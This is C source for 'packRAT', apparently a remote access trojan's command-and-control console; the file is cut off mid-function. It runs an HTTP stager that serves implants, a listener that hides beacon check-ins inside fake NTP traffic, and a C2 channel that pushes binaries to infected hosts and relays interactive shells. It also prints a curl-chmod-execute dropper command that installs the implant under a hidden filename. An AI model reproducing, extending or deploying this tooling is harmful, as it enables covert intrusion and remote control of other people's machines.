#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <net/if.h>
#include <pthread.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <dirent.h> 
#include <sys/types.h>
#include <netinet/in.h>
#include <time.h>
#include <signal.h>





/*
                              $$\       $$$$$$$\   $$$$$$\ $$$$$$$$\ 
                              $$ |      $$  __$$\ $$  __$$\\__$$  __|
 $$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\ $$ |  $$ |$$ /  $$ |  $$ |   
$$  __$$\  \____$$\ $$  _____|$$ | $$  |$$$$$$$  |$$$$$$$$ |  $$ |   
$$ /  $$ | $$$$$$$ |$$ /      $$$$$$  / $$  __$$< $$  __$$ |  $$ |   
$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$ |  $$ |$$ |  $$ |  $$ |   
$$$$$$$  |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ $$ |  $$ |$$ |  $$ |  $$ |   
$$  ____/  \_______| \_______|\__|  \__|\__|  \__|\__|  \__|  \__|   
$$ |                                                                 
$$ |                                                                 
\__|                                                                 


*/

/*
## Steps:

1. Listen on port 80 for HTTP requests
2. When a request comes in, verify that it is an HTTP request and extract the ID
3. Associate the ID to a known implant type
4. Send the implant back to the client
5. Client executes the implant - an NTP beacon which uses ntp-tunnel to wait for commands
6. When the server has a command ready, it tells the beacon to set up a secondary connection over HTTP to request the binary
7. The beacon sends an HTTP request for the binary, which is sent back to the beacon
8. The beacon executes the binary, which reroutes stdin/out/err over TCP port 443
9. The beacon sends the secondary comms channel's IP and port to the server so it can be associated with the implant ID
10. The server caches all incoming traffic on port 443, catalogging it based on remote IP and port (implant ID)
11. User options include 3 modes:
    a. General prompt (generate implants, list sessions, etc.)
    b. Session prompt (run binaries on a specific implant)
    c. Command prompt (interact with a specific binary on a specific implant)


Capabilities required:
- HTTP server
*/

//Regular text
#define BLK "\e[0;30m"
#define RED "\e[0;31m"
#define GRN "\e[0;32m"
#define YEL "\e[0;33m"
#define BLU "\e[0;34m"
#define MAG "\e[0;35m"
#define CYN "\e[0;36m"
#define WHT "\e[0;37m"

//Regular bold text
#define BBLK "\e[1;30m"
#define BRED "\e[1;31m"
#define BGRN "\e[1;32m"
#define BYEL "\e[1;33m"
#define BBLU "\e[1;34m"
#define BMAG "\e[1;35m"
#define BCYN "\e[1;36m"
#define BWHT "\e[1;37m"

//Reset
#define CRESET "\e[0m"

// NTP Server things
#define DEFAULT_NTP_PACKET (char[]) {0x24, 0x04, 0x08, 0xe7, 0x00, 0x00, 0x01, 0x17, 0x00, 0x00, 0x00, 0x56, 0xe1, 0xfe, 0x1e, 0xbe, 0xe7, 0x70, 0x15, 0x39, 0xc0, 0x84, 0x50, 0xd8, 0xe7, 0x70, 0x16, 0x41, 0x78, 0xd2, 0x91, 0x32, 0xe7, 0x70, 0x16, 0x41, 0x93, 0x4e, 0xc6, 0x9c, 0xe7, 0x70, 0x16, 0x41, 0x93, 0x51, 0xe5, 0x72}
#define NTP_TIMESTAMP_DELTA 2208988800ull


char listen_ip[16];
int stager_port = 80;
int lp_port = 123;
int c2_port = 443;


int running;
int listening;


typedef struct session {
    char* ip;
    int port;
    char* cmd;
    int conn;
    struct sockaddr_in addr;
} Session;

typedef struct beacon {
    unsigned int id;
    char* type;
    Session* sessions;
    int active_sessions;
    char pending_sessions;
    char* ip;
    int port;
    long last_seen;
    char* notes;
} Beacon;


Beacon* beacons;
int beacon_count = 0;

// Set up initial UDP listener on port 123 bound to any interface
int lp_sock;
struct sockaddr_in lp_addr;
struct sockaddr  lp_req_addr;
socklen_t lp_req_addr_len = sizeof(lp_req_addr);
char recv_msg[60];
char data[1024];

// Set up TCP listener on port 80 bound to any interface
int stage_sock;
struct sockaddr_in stage_addr, stage_req_addr; 
socklen_t stage_req_addr_len = sizeof(stage_req_addr);
char stage_req[1024];

// Set up TCP listener on port 443 bound to any interface
int c2_sock;
struct sockaddr_in c2_addr, c2_req_addr;
socklen_t c2_req_addr_len = sizeof(c2_req_addr);
char c2_req[1024];


void print(char* msg) {
    printf(CRESET "  %s\n" CRESET, msg);
}
void error(char* msg) {
    printf(RED "  [ERROR]: %s\n" CRESET, msg);
}
void warning(char* msg) {
    printf(YEL "  [WARNING]: %s\n" CRESET, msg);
}
void info (char* msg) {
    printf(BLU "  [INFO]: %s\n" CRESET, msg);
}
void success (char* msg) {
    printf(GRN "  [SUCCESS]: %s\n" CRESET, msg);
}
int promptInt(char* prompt) {
    printf(BMAG "  %s >" CRESET, prompt);
    int i;
    scanf("%d", &i);
    return i;
}
char* promptStr(char* prompt) {
    printf(BMAG "  %s >" CRESET, prompt);
    char* str = malloc(1024);
    scanf("%s", str);
    return str;
}
int clear_input() {
    int c;
    while ((c = getchar()) != '\n' && c != EOF) { }
    return 0;
}
int clear() {
    system("clear");
    return 0;
}


char* select_ip() {
    char* ip = malloc(16);
    char** ips = malloc(16 * 16);
    struct sockaddr_in *s4;
    char buf[64];
    
    for (int i = 0; i < 16; i++) {
        ips[i] = malloc(16);
    }
    struct ifaddrs *myaddrs, *ifa;
    int status;

    status = getifaddrs(&myaddrs);
    if (status != 0){
        perror("getifaddrs failed!");
        exit(1);
    }

    printf("\nSelect an interface to listen on:\n");
    int index = 0;
    for (ifa = myaddrs; ifa != NULL; ifa = ifa->ifa_next) {
        if (NULL == ifa->ifa_addr){
            continue;
        }
        if ((ifa->ifa_flags & IFF_UP) == 0) {
            continue;
        }
        
        if (AF_INET == ifa->ifa_addr->sa_family){
            s4 = (struct sockaddr_in *)(ifa->ifa_addr);
            if (NULL == inet_ntop(ifa->ifa_addr->sa_family, (void *)&(s4->sin_addr), buf, sizeof(buf))){
                printf("  [ERROR]: %s - inet_ntop failed!\n", ifa->ifa_name);
            } else {
                printf("  %d: %s - %s\n", index, ifa->ifa_name, buf);
                strcpy(ips[index], buf);
                index++;
            }
        }
        if (index >= 16) {
            ips = realloc(ips, 16 * (index));
        }
    }
    freeifaddrs(myaddrs);

    printf("  %d: Custom (Enter IP manually)\n", index++);

    printf("\nEnter index of interface selection (0-%d): ", index);
    int selection;
    scanf("%d", &selection);
    clear_input();
    if (selection < 0 || selection >= index) {
        printf("Invalid selection\n");
        select_ip();
    }
    if (selection == index - 1) {
        printf("Enter IP: ");
        scanf("%s", ip);
        return ip;
    }

    strcpy(ip, ips[selection]);
    free(ips);
    return ip;
}
char* select_type() {
    char* type = malloc(256);
    char** types = malloc(256 * 16);
    for (int i = 0; i < 16; i++) {
        types[i] = malloc(16);
    }
    printf("\nSelect a beacon type:\n");
    // List all beacon types from ./src/beacons
    DIR* dir;
    struct dirent* ent;
    int index = 0;
    if ((dir = opendir("./src/beacons")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0 || (strlen(ent->d_name) > 1 && ent->d_name[strlen(ent->d_name) - 2] == '.')) {
                continue;
            }
            printf("  %d: %s\n", index, ent->d_name);
            strcpy(types[index], ent->d_name);
            index++;
            if (index >= 16) {
                types = realloc(types, 16 * (index));
            }
        }
        closedir(dir);
    } else {
        error("Could not open directory ./src/beacons - please make sure it exists and packRAT is running from the correct directory");
        exit(1);
    }
    index--;
    printf("\nEnter index of beacon type (0-%d): ", index);
    int selection;
    scanf("%d", &selection);
    clear_input();
    if (selection < 0 || selection >= index) {
        printf("Invalid selection\n");
        select_type();
    }
    // Return the selected beacon type
    strcpy(type, types[selection]);
    free(types);
    return type;
}
int set(char* option, char* value) {
    if (strcmp(option, "listen-ip") == 0) {
        strcpy(listen_ip, value);
        return 0;
    }
    if (strcmp(option, "stage-port") == 0) {
        lp_port = atoi(value);
        return 0;
    }
    if (strcmp(option, "lp-port") == 0) {
        lp_port = atoi(value);
        return 0;
    }
    if (strcmp(option, "c2-port") == 0) {
        c2_port = atoi(value);
        return 0;
    }
    printf("Invalid option\n");
    return -1;
}

int banner() {
    // Clear the screen
    clear();
    // Print the banner
    printf(BBLU "\n");
    printf("                              $$\\       $$$$$$$\\   $$$$$$\\ $$$$$$$$\\ \n");
    printf("                              $$ |      $$  __$$\\ $$  __$$\\\\__$$  __|\n");
    printf(" $$$$$$\\   $$$$$$\\   $$$$$$$\\ $$ |  $$\\ $$ |  $$ |$$ /  $$ |  $$ |   \n");
    printf("$$  __$$\\  \\____$$\\ $$  _____|$$ | $$  |$$$$$$$  |$$$$$$$$ |  $$ |   \n");
    printf("$$ /  $$ | $$$$$$$ |$$ /      $$$$$$  / $$  __$$< $$  __$$ |  $$ |   \n");
    printf("$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$ |  $$ |$$ |  $$ |  $$ |   \n");
    printf("$$$$$$$  |\\$$$$$$$ |\\$$$$$$$\\ $$ | \\$$\\ $$ |  $$ |$$ |  $$ |  $$ |   \n");
    printf("$$  ____/  \\_______| \\_______|\\__|  \\__|\\__|  \\__|\\__|  \\__|  \\__|   \n");
    printf("$$ |                                                                 \n");
    printf("$$ |                                                                 \n");
    printf("\\__|                                                                 \n");
    printf("\n");
    printf("\n" CRESET);
    return 0;
}
int help() {
    printf(BCYN "  COMMANDS: \n" CYN);
    printf("    help - Show this help menu\n");
    printf("    b[eacon] - Generate a new beacon implant and print dropper command\n");
    printf("    ls - List all active beacons\n");
    printf("    use <id> - enter session mode for beacon (to execute commands on it)\n");
    printf("    burn <id> - Burn a beacon (self-destruct and clean up)\n");
    printf("    l[isten] - Select IP to listen on and start listening\n");
    printf("    exit - Exit the console\n");
    printf("\n" CRESET);
    return 0;
}
int status() {
    printf("  [STATUS]\n");
    if (stage_sock) {
        printf(GRN "    Stager: Listening on %s:%d\n" CRESET, listen_ip, stager_port);
    } else {
        printf(YEL "    Stager: Not running\n" CRESET);
    }
    if (lp_sock) {
        printf(GRN "    LP:     Listening on %s:%d\n" CRESET, listen_ip, lp_port);
    } else {
        printf(YEL "    LP:     Not running\n" CRESET);
    }
    if (c2_sock) {
        printf(GRN "    C2:     Listening on %s:%d\n" CRESET, listen_ip, c2_port);
    } else {
        printf(YEL "    C2:     Not running\n" CRESET);
    }
    return 0;
}


int stager_req_id(char* req) {
    if (strlen(req) < 5 || strncmp(req, "GET /", 5) != 0) {
        return -1;
    }
    return atoi(req + 6);
}
char* stager_req_ip(char* req) {
    char* r = malloc(strlen(req) + 1);
    strcpy(r, req);
    r = strtok(r, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(r, "\n");
    return r;
}
char* load_beacon(char* type, int id) {
    char* path = malloc(256 + 8);
    strcpy(path, "./src/beacons/");
    strcat(path, type);
    FILE* f = fopen(path, "r");
    if (f == NULL) {
        error("Beacon could not be loaded\n");
        return NULL;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    char* beacon = malloc(fsize + 1);
    fread(beacon, fsize, 1, f);
    fclose(f);
    free(path);
    beacon[fsize] = 0;

    // Replace any occurances of ${C2_IP} with host and ${C2_PORT} with lp_port
    int int_placeholder = 12345;
    char* str_c2_port = malloc(6);
    sprintf(str_c2_port, "%d", c2_port);
    char* str_lp_port = malloc(6);
    sprintf(str_lp_port, "%d", lp_port);
    for (int i = 0; i < fsize - 15; i++) {
        if (strncmp(beacon + i, "${C2_IP_XXXXXX}", 15) == 0 || strncmp(beacon + i, "XXX.XXX.XXX.XXX", 15) == 0) {
            memcpy(beacon + i, listen_ip, strlen(listen_ip));
            memcpy(beacon + i + strlen(listen_ip), beacon + i + 15, fsize - i - 15);
            beacon[fsize - 15 + strlen(listen_ip)] = 0;
        }
    }
    for (int i = 0; i < fsize - 10; i++) {
        if (strncmp(beacon + i, "${C2_PORT}", 10) == 0) {
            memcpy(beacon + i, str_c2_port, strlen(str_c2_port));
            memcpy(beacon + i + strlen(str_c2_port), beacon + i + 10, fsize - i - 10);
            beacon[fsize - 10 + strlen(str_c2_port)] = 0;
        }
    }
    for (int i = 0; i < fsize - 10; i++) {
        if (strncmp(beacon + i, "${LP_PORT}", 10) == 0) {
            memcpy(beacon + i, str_lp_port, strlen(str_lp_port));
            memcpy(beacon + i + strlen(str_lp_port), beacon + i + 10, fsize - i - 10);
            beacon[fsize - 10 + strlen(str_lp_port)] = 0;
        }
    }
    for (int i = 0; i < fsize - 4; i++) {
        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
            memcpy(beacon + i, &lp_port, 4);
        }
    }
    int_placeholder = 54321;
    for (int i = 0; i < fsize - 4; i++) {
        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
            memcpy(beacon + i, &id, 4);
        }
    }
    return beacon;
}

char* gen_stager_resp(int id, char* host) {
    if (id < 0 || id > beacon_count) {
        char* resp = malloc(256);
        strcpy(resp, "HTTP/1.1 404 Not Found\r\n\r\n");
        error("Invalid beacon ID\n");
        return resp;
    }
    char* beacon = load_beacon(beacons[id].type, id);
    if (beacon == NULL) {
        char* resp = malloc(256);
        strcpy(resp, "HTTP/1.1 404 Not Found\r\n\r\n");
        error("Beacon could not be loaded\n");
        return resp;
    }
    char* resp = malloc(strlen(beacon) + 24);
    strcpy(resp, "HTTP/1.1 200 OK\r\n\r\n");
    strcat(resp, beacon);
    resp[strlen(beacon) + 24] = 0;
    free(beacon);
    fflush(stdout);
    return resp;
}


int init_stager() {
    // Create TCP socket
    stage_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(stage_sock < 0){
        printf("Problem while creating staging socket\n");
        return -1;
    }

    int bind_succes = 0;

    // Set port and IP:
    stage_addr.sin_family = AF_INET;
    stage_addr.sin_port = htons(stager_port);
    stage_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind to the set port and IP:
    while(bind(stage_sock, (const struct sockaddr*)&stage_addr, stage_req_addr_len) < 0){
        printf(RED "  [ERROR]:   Stager couldn't bind to port %d, trying port %d\n" CRESET, stager_port, stager_port + 1);
        fflush(stdout);
        stager_port++;
        if (stager_port == 90) {
            stager_port = 8080;
        }
        if (stager_port == 8090) {
            printf("Port bind failed\n");
            return -1;
        }
        stage_addr.sin_port = htons(stager_port);
    }
    printf(GRN "  [SUCCESS]: Stager bound to port %d\n" CRESET, stager_port);
    fflush(stdout);
    return 0;
}
void *stager_loop(void *vargp) {
    while (running) {
        // Listen for incoming connections:
        if(listen(stage_sock, 1) < 0){
            perror("Problem while listening");
            continue;
        }
        // Accept incoming connection:
        int conn = accept(stage_sock, (struct sockaddr*)&stage_req_addr, &stage_req_addr_len);
        if(conn < 0){
            perror("Problem while accepting connection");
            continue;
        }
        // Receive HTTP request:
        int recv_len = recvfrom(conn, stage_req, 1024, 0, (struct sockaddr*)&stage_req_addr, &stage_req_addr_len);
        if(recv_len < 0){
            perror("Problem while receiving message");
            continue;
        }
        stage_req[recv_len] = 0;
        // Parse HTTP request
        int id = stager_req_id(stage_req);
        if (id < 0) {
            // Invalid request
            continue;
        }
        char* host = stager_req_ip(stage_req);
        // Respond with an implant matching the requested ID with the correct host
        char* resp = gen_stager_resp(id, host);

        // Send response:
        stage_req_addr_len = sizeof(stage_req_addr);
        if(sendto(conn, resp, strlen(resp), 0, (struct sockaddr*)&stage_req_addr, stage_req_addr_len) < 0){
            perror("Problem while sending message");
            continue;
        }
        // Close connection:
        close(conn);
        printf(BLU "  [INFO]: Stager requested using ID %d from host %s\n" CRESET, id, host);
    }
    info("  Stager thread exiting\n");
    return NULL;
}

int init_lp() {
    srand(time(NULL));

    // Create UDP socket:
    lp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(lp_sock < 0){
        error("Problem while creating lp socket\n");
        return -1;
    }

    int bind_succes = 0;

    // Set port and IP:
    bzero(&lp_addr, sizeof(lp_addr));
    lp_addr.sin_family = AF_INET;
    lp_addr.sin_port = htons(123);
    lp_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind to the set port and IP:
    while(bind(lp_sock, (struct sockaddr*)&lp_addr, sizeof(lp_addr)) < 0){
        printf(RED "  [ERROR]: LP couldn't bind to port %d, trying port %d\n" CRESET, lp_port, lp_port + 1);
        fflush(stdout);
        lp_port++;
        if (lp_port == 133) {
            error("LP port bind failed\n");
            return -1;
        }
        lp_addr.sin_port = htons(lp_port);
    }
    printf(GRN "  [SUCCESS]: LP bound to port %d\n" CRESET, lp_port);
    return 0;
}
void *lp_loop(void *vargp) {
    while (running) {
        time_t t;
        int id = 0;
        char buffer[1024];
        unsigned int delta;
        int n = recvfrom(lp_sock, buffer, 1024, 0, &lp_req_addr, &lp_req_addr_len);
        if (n == 48) {

            if ((unsigned char) buffer[0] == 0xe3) {
                id =  ntohl(*(unsigned int *)&buffer[40]) ^ (*(unsigned int *)&buffer[44]);
                //printf("Received ping from %d\n", id);
            } else {
                id = -1;
                warning("Possible probing, received standard NTP request");
            }

            // Prep response
            memcpy(buffer, DEFAULT_NTP_PACKET, 16);
            memcpy(buffer + 24, buffer + 40, 8);

            t = time(NULL);
            delta = htonl(t + NTP_TIMESTAMP_DELTA);
            memcpy(&buffer[40], &delta, 4);
            memcpy(&buffer[32], &delta, 4);
            delta = rand();
            memcpy(&buffer[44], &delta, 4);
            delta = htonl(delta + (rand() % 100));
            memcpy(&buffer[36], &delta, 4);
            delta = htonl((t + NTP_TIMESTAMP_DELTA) - 4096 - (rand() % 100));
            memcpy(&buffer[16], &delta, 4);
            delta = rand();
            memcpy(&buffer[20], &delta, 4);

            if (id > -1 && id < beacon_count) {
                int port = htonl(c2_port);
                int c2_inet = inet_addr(listen_ip);
                unsigned char sleep_level = 3;

                
                memcpy(&buffer[4], &port, 4);
                memcpy(&buffer[12], &c2_inet, 4);

                buffer[2] = sleep_level;
                buffer[47] = buffer[46] ^ buffer[45] ^ buffer[44] ^ beacons[id].pending_sessions;

                beacons[id].last_seen = time(NULL);
            }

            // Send NTP packet
            sendto(lp_sock, buffer, 48, 0, (struct sockaddr *)&lp_req_addr, sizeof(lp_req_addr));
        }
    }
    info("  LP thread exiting\n");
    return NULL;
}

int init_c2() {
    // Create TCP socket
    c2_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(c2_sock < 0){
        printf("Problem while creating staging socket\n");
        return -1;
    }

    int bind_succes = 0;

    // Set port and IP:
    c2_addr.sin_family = AF_INET;
    c2_addr.sin_port = htons(c2_port);
    c2_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind to the set port and IP:
    while(bind(c2_sock, (const struct sockaddr*)&c2_addr, c2_req_addr_len) < 0){
        printf(RED "  [ERROR]:   C2 listener couldn't bind to port %d, trying port %d\n" CRESET, c2_port, c2_port + 1);
        fflush(stdout);
        c2_port++;
        if (c2_port == 453) {
            c2_port = 4343;
        }
        if (c2_port == 4353) {
            printf("C2 port bind failed\n");
            return -1;
        }
        stage_addr.sin_port = htons(c2_port);
    }
    printf(GRN "  [SUCCESS]: Stager bound to port %d\n" CRESET, c2_port);
    fflush(stdout);
    return 0;
}
void *c2_loop(void *vargp) {
    int id = 0;
    while (running) {
        if(listen(c2_sock, 1) < 0){
            perror("Problem while listening");
            continue;
        }
        // Accept incoming connection:
        int conn = accept(c2_sock, (struct sockaddr*)&c2_req_addr, &c2_req_addr_len);
        if(conn < 0){
            perror("Problem while accepting connection");
            continue;
        }
        // Receive header packet
        int recv_len = recvfrom(conn, &id, 4, 0, (struct sockaddr*)&c2_req_addr, &c2_req_addr_len);
        if(recv_len < 0){
            perror("Problem while receiving message");
            continue;
        }

        // Verify ID within bounds
        if (id < 0 || id >= beacon_count) {
            printf("  [WARNING]: Invalid ID received from C2\n");
            continue;
        }

        // Connect connection to next pending session on that beacon
        beacons[id].sessions[beacons[id].active_sessions].conn = conn;
        beacons[id].sessions[beacons[id].active_sessions].ip = inet_ntoa(c2_req_addr.sin_addr);
        beacons[id].sessions[beacons[id].active_sessions].port = ntohs(c2_req_addr.sin_port);
        beacons[id].sessions[beacons[id].active_sessions].addr = c2_req_addr;

        char* line = malloc(strlen(beacons[id].sessions[beacons[id].active_sessions].cmd) + 1);
        strcpy(line, beacons[id].sessions[beacons[id].active_sessions].cmd);

        beacons[id].active_sessions++;
        beacons[id].pending_sessions--;

        // Run the command staged for the session
        char* args = malloc(strlen(line) + 1);
        strcpy(args, line);
        char* file = strtok(line, " ");
        int args_len = strlen(args) + 1;

        FILE *pp;
        char path[1024];
        char which[1024];

        /* Open the command for reading. */
        sprintf(which, "/bin/which %s", file);
        pp = popen(which, "r");
        if (pp == NULL) {
            printf("Failed to find command %s\n", file);
            continue;
        }

        if (fgets(path, sizeof(path), pp) == NULL) {
            printf("Failed to find command %s\n", file);
            continue;
        }

        pclose(pp);
        path[strlen(path) - 1] = '\0';
        FILE *fp = fopen(path, "r");
        if (fp == NULL) {
            printf("Error opening file %s\n", path);
            continue;
        }

        fseek(fp, 0, SEEK_END);
        int data_len = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        // Send header packet
        int lengths[2] = {args_len, data_len};
        sendto(conn, lengths, 8, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);

        // Send the arguments packet
        sendto(conn, args, args_len, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);

        char* data_buf = malloc(data_len);

        fread(data_buf, 1, data_len, fp);
        fclose(fp);

        // Send the data packet
        int sent = 0;
        while (data_len > 1024) {
            sent = sendto(conn, data_buf, 1024, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);
            if (sent < 0) {
                perror("Error sending data");
                break;
            }
            data_len -= sent;
            data_buf += sent;
        }
        sent = sendto(conn, data_buf, data_len, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);
        if (sent < 0) {
            perror("Error sending data");
        }
    }
    info("  C2 thread exiting\n");
    return NULL;
}


int start_listeners() {
    strcpy(listen_ip, select_ip());

    // Initialize the stager
    if (init_stager() < 0) {
        error("Stager initialization failed");
        return -1;
    }

    // Initialize the lp
    if (init_lp() < 0) {
        error("LP initialization failed");
        return -1;
    }

    // Initialize the c2
    if (init_c2() < 0) {
        error("C2 initialization failed");
        return -1;
    }

    // Launch the stager
    pthread_t stager_thread;
    pthread_create(&stager_thread, NULL, stager_loop, NULL);

    // Launch the lp
    pthread_t lp_thread;
    pthread_create(&lp_thread, NULL, lp_loop, NULL);

    // Launch the c2
    pthread_t c2_thread;
    pthread_create(&c2_thread, NULL, c2_loop, NULL);

    listening = 1;

    return 0;
}
int generate_beacon() {
    if (!listening) {
        printf(RED "  [ERROR]: You must start listening before generating a beacon\n" CRESET);
        printf(BLU "  [INFO]: Use the 'listen' command to start listening\n" CRESET);
        return -1;
    }

    beacons = realloc(beacons, sizeof(struct beacon) * (beacon_count + 1));
    beacons[beacon_count].id = beacon_count;
    beacons[beacon_count].last_seen = 0;
    beacons[beacon_count].port = 0;
    beacons[beacon_count].notes = malloc(1024);
    beacons[beacon_count].notes[0] = 0;
    beacons[beacon_count].type = malloc(256);
    beacons[beacon_count].type = select_type();
    beacons[beacon_count].ip = malloc(16);
    beacons[beacon_count].ip[0] = 0;
    beacons[beacon_count].sessions = NULL;
    beacons[beacon_count].active_sessions = 0;
    beacons[beacon_count].pending_sessions = 0;

    printf(BLU "  [INFO]: Beacon generated for %s with ID %d\n" CRESET, beacons[beacon_count].type, beacons[beacon_count].id);
    printf(BLU "          Copy the following command into the remote system to install the beacon:\n\n" CRESET);
    printf(BBLU "          curl %s:%d/%d > ., && chmod +x ., && ./.,\n\n" CRESET, listen_ip, stager_port, beacons[beacon_count].id);
    beacon_count++;

    return 0;
}
int list_beacons() {
    if (beacon_count == 0) {
        printf("  No beacons - use the b[eacon] command to generate beacons\n\n");
        return 0;
    }
    int active_count = 0;
    int inactive_count = 0;
    for (int i = 0; i < beacon_count; i++) {
        if (beacons[i].last_seen > 0) {
            active_count++;
        } else {
            inactive_count++;
        }
    }
    if (active_count) {
        printf(BGRN "  Active beacons:\n" GRN);
    } else {
        printf(GRN "  No active beacons\n");
    }
    for (int i = 0; i < beacon_count; i++) {
        if (beacons[i].last_seen > 0) {
            printf("    %d: %s:%d (%s) - seen %lus ago \n", i, beacons[i].ip, beacons[i].port, beacons[i].type, time(NULL) - beacons[i].last_seen);
        }
    }
     if (inactive_count) {
        printf(BYEL "  Inactive beacons:\n" YEL);
    } else {
        printf(YEL "  No inactive beacons\n");
    }
    for (int i = 0; i < beacon_count; i++) {
        if (beacons[i].last_seen == 0) {
            printf("    %d: %s:%d (%s)\n", i, beacons[i].ip, beacons[i].port, beacons[i].type);
        }
    }
    printf(CRESET "\n");
    return 0;
}


int session_prompt(int beacon_id, int session_id) {
    if (beacon_id < 0 || beacon_id >= beacon_count) {
        printf(RED "  [ERROR]: Invalid beacon ID %d\n" CRESET, beacon_id);
        return -1;
    }
    if (session_id < 0 || session_id >= beacons[beacon_id].active_sessions) {
        printf(RED "  [ERROR]: Invalid session ID %d\n" CRESET, session_id);
        return -1;
    }
    int conn = beacons[beacon_id].sessions[session_id].conn;

    char buffer[1024];
    int connected = 1;
    struct sockaddr_in cliaddr = beacons[beacon_id].sessions[session_id].addr;
    socklen_t cliaddr_len = sizeof(cliaddr);
    pid_t pid = fork();
    if (!pid) {
        while (connected) {
            // Receive data
            int recv_len = recvfrom(conn, buffer, 1024, 0, (struct sockaddr*)&cliaddr, &cliaddr_len);
            if(recv_len < 0){
                error("Problem while receiving message");
                connected = 0;
                continue;
            }
            if (recv_len == 0) {
                connected = 0;
                break;
            }
            buffer[recv_len] = '\0';
            printf("%s", buffer);
            fflush(stdout);
        }
    } else {
        while (connected) {
            // Send data
            char* line = NULL;
            size_t len = 0;
            getline(&line, &len, stdin);
            if (strcmp(line, "exit\n") == 0) {
                kill(pid, SIGKILL);
                return 0;
            }
            int sent = sendto(conn, line, strlen(line), 0, (struct sockaddr*)&cliaddr, cliaddr_len);
            if (sent < 0) {
                connected = 0;
                error("Error sending data");
            }
        }
    }
}
int beacon_prompt(int id) {
    if (id < 0 || id >= beacon_count) {
        printf(RED "    [ERROR]: Invalid beacon ID\n" CRESET);
        return -1;
    }

    printf(BBLU "    Beacon %d (%s:%d) - %s\n" CRESET, id, beacons[id].ip, beacons[id].port, beacons[id].type);
    printf(BBLU "    Type 'help' for a list of commands\n" CRESET);

    while (1) {
        printf(BBLU "  (beacon %d)>> " CRESET, id);

        char input[256];
        fgets(input, 256, stdin);

        if (strcmp(input, "help\n") == 0) {
            printf(CYN "    help - print this help message\n");
            printf("    clear - clear the screen\n");
            printf("    status - print the beacon's status\n");
            printf("    ls - list the beacon's sessions\n");
            printf("    run <command> - run a command on the beacon\n");
            printf("    use <session id> - enter a session\n");
            printf("    exit - exit the beacon prompt\n" CRESET);
        } else if (strcmp(input, "clear\n") == 0) {
            clear();
        } else if (strcmp(input, "status\n") == 0) {
            printf(GRN "    ID: %d (%s:%d)\n", id, beacons[id].ip, beacons[id].port);
            printf("    Type: %s\n", beacons[id].type);
            printf("    Last seen: %lus ago\n", time(NULL) - beacons[id].last_seen);
            printf("    Active sessions: %d\n", beacons[id].active_sessions);
            printf("    Pending sessions: %d\n" CRESET, beacons[id].pending_sessions);
        } else if (strcmp(input, "ls\n") == 0) {
            if (beacons[id].active_sessions == 0 && beacons[id].pending_sessions == 0) {
                printf(BCYN "    No sessions - to start new session use the 'run <command>' command\n" CRESET);
            } else {
                if (beacons[id].active_sessions > 0) {
                    printf(BGRN "    Active sessions:\n" GRN);
                } else {
                    printf(GRN "    No active sessions\n" GRN);
                }
                for (int i = 0; i < beacons[id].active_sessions; i++) {
                    printf("      %d: %s\n", i, beacons[id].sessions[i].cmd);
                }
                if (beacons[id].pending_sessions > 0) {
                    printf(BYEL "    Pending sessions:\n" YEL);
                } else {
                    printf(YEL "    No pending sessions\n" YEL);
                }
                for (int i = 0; i < beacons[id].pending_sessions; i++) {
                    printf("      %d: %s\n", i, beacons[id].sessions[i + beacons[id].active_sessions].cmd);
                }
                printf("\n" CRESET);
            }
        } else if (strncmp(input, "run ", 4) == 0) {
            if (strlen(input) < 5) {
                printf(RED "    [USAGE]: run <command>\n" CRESET);
                continue;
            }
            char *cmd = input + 4;
            cmd[strlen(cmd) - 1] = 0;
            printf("    [INFO]: Running command '%s'\n", cmd);
            beacons[id].sessions = realloc(beacons[id].sessions, (beacons[id].active_sessions + beacons[id].pending_sessions + 1) * sizeof(struct session));
            beacons[id].sessions[beacons[id].active_sessions + beacons[id].pending_sessions].cmd = malloc(strlen(cmd) + 1);
            strcpy(beacons[id].sessions[beacons[id].active_sessions + beacons[id].pending_sessions].cmd, cmd);
            beacons[id].pending_sessions++;
        } else if (strncmp(input, "use ", 4) == 0) {
            int session_id = atoi(input + 4);
            if (session_id < 0 || session_id >= beacons[id].active_sessions + beacons[id].pending_sessions) {
                printf(RED "    [ERROR]: Invalid session ID\n" CRESET);
            } else {
                if (session_id > beacons[id].active_sessions) {
                    printf("    [ERROR]: Session is not yet active, please wait for beacon to begin sessions\n");
                } else {
                    session_prompt(id, session_id);
                }
            }
        } else if (strcmp(input, "exit\n") == 0) {
            return 0;
        } else {
            printf(RED "    [ERROR]: Invalid command\n" CRESET);
        }
    }
}
int prompt() {
    // Print the prompt
    printf(BRED "(packRAT)>> " CRESET);

    // Read the input
    char input[256];
    fgets(input, 256, stdin);

    // Execute the command
    if (strcmp(input, "\n") == 0) {
        return 0;
    } else if (strcmp(input, "help\n") == 0) {
        help();
    } else if (strcmp(input, "clear\n") == 0) {
        clear();
    } else if (strcmp(input, "status\n") == 0) {
        status();
    } else if (strcmp(input, "l\n") == 0 || strcmp(input, "listen\n") == 0) {
        start_listeners();
    } else if (strcmp(input, "b\n") == 0 || strcmp(input, "beacon\n") == 0) {
        generate_beacon();
    } else if (strcmp(input, "ls\n") == 0) {
        list_beacons();
